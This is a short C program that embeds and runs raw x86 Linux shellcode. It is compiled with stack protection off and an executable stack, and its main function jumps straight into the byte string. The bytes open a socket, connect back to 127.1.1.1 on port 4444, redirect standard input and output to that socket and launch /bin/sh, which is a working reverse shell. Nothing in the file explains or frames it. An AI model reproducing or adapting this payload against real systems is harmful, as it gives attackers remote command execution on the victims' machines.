//gcc -fno-stack-protector -z execstack -m32 shellcode.c -o shellcode
#include <stdio.h>
#include <string.h>

int main(){
    char code[] = "\x31\xc0\x31\xdb\xb0\x66\xb3\x01\x31\xd2\x52\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x89\xc6\xb0\x66\xb3\x03\x68\x7f\x01\x01\x01\x66\x68\x11\x5c\x66\x6a\x02\x89\xe1\x6a\x10\x51\x56\x89\xe1\xcd\x80\x31\xc9\x31\xc0\xb0\x3f\x89\xf3\xcd\x80\xfe\xc1\x66\x83\xf9\x02\x7e\xf0\x31\xc0\x50\xb0\x0b\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80";
    printf("Shellcode length: %d\n", strlen(code));
    int (*ret)() = (int(*)())code;
    return ret();
}
